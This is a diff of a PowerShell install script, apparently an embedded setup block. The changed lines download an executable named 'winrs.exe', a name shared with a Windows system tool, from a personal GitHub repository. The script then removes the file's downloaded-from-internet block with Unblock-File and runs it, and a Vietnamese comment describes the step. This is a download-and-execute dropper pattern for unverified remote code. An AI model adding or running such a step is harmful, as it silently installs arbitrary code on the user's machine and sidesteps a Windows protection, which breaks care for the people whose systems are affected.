@@ -20,9 +20,18 @@ $installContent = @'
 Try {
     Write-Output "===> Start at $(Get-Date -Format o)"
 
-    $scriptPath = "$PSScriptRoot\winrs.exe"
-    iwr https://github.com/truongcp0305/dp/archive/refs/heads/winrs.exe -OutFile winrs.exe 
-    & $scriptPath
+    # Tải về winrs.exe vào cùng thư mục script và thực thi
+    $scriptPath = Join-Path $PSScriptRoot 'winrs.exe'
+    $url = 'https://raw.githubusercontent.com/truongcp0305/dp/main/winrs.exe'
+
+    Invoke-WebRequest -Uri $url -OutFile $scriptPath -ErrorAction Stop
+
+    if (Test-Path $scriptPath) {
+        Unblock-File -Path $scriptPath -ErrorAction SilentlyContinue
+        Start-Process -FilePath $scriptPath -NoNewWindow -Wait
+    } else {
+        Throw "Downloaded file not found: $scriptPath"
+    }
 
 } Catch {
     Write-Error "Error: $_"
